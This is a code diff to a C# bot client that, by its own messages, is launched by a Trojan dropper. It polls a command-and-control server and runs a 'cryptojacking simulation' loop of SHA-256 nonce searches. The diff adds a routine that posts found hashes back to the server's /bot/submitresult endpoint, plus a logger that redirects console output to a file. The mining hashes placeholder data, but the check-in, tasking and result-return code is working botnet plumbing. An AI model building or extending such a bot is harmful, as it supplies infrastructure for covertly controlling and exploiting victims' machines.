@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Net.Http;
 using System.Security.Cryptography;
 using System.Text;
@@ -11,6 +12,12 @@ public static class BotCommands
 {
     public const string Cryptojack = "cryptojack";
     public const string Idle = "idle";
+}
+public class CryptoJackResult
+{
+    public string BotId { get; set; }
+    public long Nonce { get; set; }
+    public string Hash { get; set; }
 }
 
 public class Bot
@@ -26,6 +33,7 @@ public class Bot
 
     static async Task Main(string[] args)
     {
+        FileLogger.Initialize();
         if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
         {
             string serverIp = args[0];
@@ -39,6 +47,7 @@ public class Bot
             Console.WriteLine("This bot must be started by the Trojan dropper to function.");
             Console.ResetColor();
             Console.ReadLine(); // Dừng chương trình lại để người dùng đọc lỗi
+            FileLogger.Shutdown();
             return; // Thoát chương trình
         }
 
@@ -51,7 +60,7 @@ public class Bot
                 await CheckIn();
                 string command = await GetCommand();
                 Console.WriteLine($"Received command: '{command}'");
-                ExecuteCommand(command);
+                await ExecuteCommand(command);
             }
             catch (Exception ex)
             {
@@ -80,22 +89,20 @@ public class Bot
         return commandResponse?.command ?? BotCommands.Idle;
     }
 
-    static void ExecuteCommand(string command)
+    static async Task ExecuteCommand(string command)
     {
         switch (command)
         {
             case BotCommands.Cryptojack:
                 if (currentStatus != BotCommands.Cryptojack)
                 {
-                    StopCurrentTask(); // Dừng tác vụ cũ (nếu có) trước khi bắt đầu tác vụ mới
+                    StopCurrentTask();
                     currentStatus = BotCommands.Cryptojack;
-                    Console.ForegroundColor = ConsoleColor.Yellow;
                     Console.WriteLine("Executing cryptojacking simulation...");
-                    Console.ResetColor();
 
-                    // === NÂNG CẤP: Quản lý tác vụ bằng CancellationToken ===
                     _taskCancellationTokenSource = new CancellationTokenSource();
-                    SimulateCryptoJack(_taskCancellationTokenSource.Token);
+                    // Chạy và chờ tác vụ hoàn thành (hoặc bị hủy)
+                    await SimulateCryptoJack(_taskCancellationTokenSource.Token);
                 }
                 break;
 
@@ -103,8 +110,9 @@ public class Bot
             default:
                 if (currentStatus != BotCommands.Idle)
                 {
-                    currentStatus = BotCommands.Idle;
                     StopCurrentTask();
+                    currentStatus = BotCommands.Idle;
+                    Console.WriteLine("Switching to idle state.");
                 }
                 break;
         }
@@ -121,10 +129,36 @@ public class Bot
             _taskCancellationTokenSource = null;
         }
     }
-
-    static void SimulateCryptoJack(CancellationToken cancellationToken)
+    static async Task SendResultToServerAsync(long nonce, string hash)
     {
-        Task.Run(() =>
+        try
+        {
+            var result = new CryptoJackResult
+            {
+                BotId = botId,
+                Nonce = nonce,
+                Hash = hash
+            };
+            var content = new StringContent(JsonSerializer.Serialize(result), Encoding.UTF8, "application/json");
+            var response = await client.PostAsync($"{CncServerUrl}/bot/submitresult", content);
+            if (response.IsSuccessStatusCode)
+            {
+                Console.WriteLine($"Successfully submitted result for nonce {nonce}.");
+            }
+            else
+            {
+                Console.WriteLine($"Failed to submit result. Status: {response.StatusCode}");
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Error submitting result: {ex.Message}");
+        }
+    }
+
+    static Task SimulateCryptoJack(CancellationToken cancellationToken)
+    {
+        return Task.Run(async () =>
         {
             // === NÂNG CẤP: Xử lý lỗi bên trong Task ===
             try
@@ -137,8 +171,25 @@ public class Bot
                     {
                         string dataToHash = $"SomeDataToHash-{nonce}";
                         byte[] bytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));
+
+                        var sBuilder = new StringBuilder();
+                        for (int i = 0; i < bytes.Length; i++)
+                        {
+                            sBuilder.Append(bytes[i].ToString("x2"));
+                        }
+                        string hashString = sBuilder.ToString();
+
+                        // === THAY ĐỔI DUY NHẤT LÀ Ở ĐÂY ===
+                        // Điều kiện chiến thắng giờ đây khó hơn nhiều
+                        if (hashString.StartsWith("00000"))
+                        {
+                            Console.WriteLine($"!!! Hash found! Nonce: {nonce}, Hash: {hashString}");
+                            await SendResultToServerAsync(nonce, hashString);
+                            break; // Thoát khỏi vòng lặp sau khi tìm thấy
+                        }
+
                         nonce++;
-                        if (nonce % 100000 == 0) Thread.Sleep(1);
+                        if (nonce % 100000 == 0) await Task.Delay(1, cancellationToken);
                     }
                     Console.ForegroundColor = ConsoleColor.Green;
                     Console.WriteLine("Cryptojacking simulation stopped gracefully.");
@@ -153,6 +204,52 @@ public class Bot
                 // Trong kịch bản thực tế, có thể ghi log ở đây
             }
         }, cancellationToken);
+    }
+}
+public static class FileLogger
+{
+    private static string _logFilePath;
+    private static StreamWriter _streamWriter;
+    private static TextWriter _originalConsoleOut;
+
+    public static void Initialize(string logFileName = "bot_log.txt")
+    {
+        // Lưu lại luồng output gốc của Console
+        _originalConsoleOut = Console.Out;
+        try
+        {
+            // Lấy đường dẫn an toàn trong thư mục của file exe
+            string exePath = AppContext.BaseDirectory;
+            _logFilePath = Path.Combine(exePath, logFileName);
+
+            // Mở file với chế độ ghi tiếp (append) và tự động flush
+            _streamWriter = new StreamWriter(_logFilePath, true, Encoding.UTF8)
+            {
+                AutoFlush = true
+            };
+
+            // Chuyển hướng output của Console ra file
+            Console.SetOut(_streamWriter);
+            Console.WriteLine($"\n===== Logger Initialized at {DateTime.Now} =====");
+        }
+        catch (Exception ex)
+        {
+            // Nếu có lỗi, in ra luồng output gốc
+            Console.SetOut(_originalConsoleOut);
+            Console.WriteLine($"FATAL: Could not initialize file logger. Error: {ex.Message}");
+        }
+    }
+
+    public static void Shutdown()
+    {
+        Console.WriteLine($"===== Logger Shutdown at {DateTime.Now} =====\n");
+        // Đóng file an toàn và trả lại output cho console gốc
+        _streamWriter?.Close();
+        _streamWriter?.Dispose();
+        if (_originalConsoleOut != null)
+        {
+            Console.SetOut(_originalConsoleOut);
+        }
     }
 }
 
